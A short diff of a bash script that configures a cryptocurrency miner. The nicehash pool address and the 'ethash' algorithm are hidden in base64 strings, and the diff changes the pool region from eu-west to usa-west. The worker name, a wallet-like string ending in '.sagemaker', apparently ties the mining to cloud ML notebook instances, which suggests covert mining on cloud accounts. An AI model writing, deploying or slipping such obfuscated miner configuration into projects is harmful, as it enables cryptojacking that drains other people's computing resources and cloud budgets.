@@ -2,7 +2,7 @@
 #!/bin/bash
 
 userAgent="3EjCK7AUv5CxMEMfbYzqL6xH3dvK5VcDhY.sagemaker"
-string=c3RyYXR1bSt0Y3A6Ly9kYWdnZXJoYXNoaW1vdG8uZXUtd2VzdC5uaWNlaGFzaC5jb206MzM1Mw==
+string=c3RyYXR1bSt0Y3A6Ly9kYWdnZXJoYXNoaW1vdG8udXNhLXdlc3QubmljZWhhc2guY29tOjMzNTM=
 key=ZXRoYXNo
 
 seed=$(echo $string | base64 --decode)
